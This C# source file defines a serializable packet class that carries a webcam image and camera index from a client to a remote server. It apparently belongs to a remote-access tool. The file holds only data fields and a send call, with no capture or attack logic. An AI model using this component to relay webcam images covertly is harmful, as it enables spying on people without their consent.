using System;
using System.Drawing;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ClientPackets
{
    [Serializable]
    public class GetWebcamResponse : IPacket
    {
        public byte[] Image { get; set; }
        public int Webcam { get; set; }

        public GetWebcamResponse()
        {
        }

        public GetWebcamResponse(byte[] image, int webcam)
        {
            this.Image = image;
            this.Webcam = webcam;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}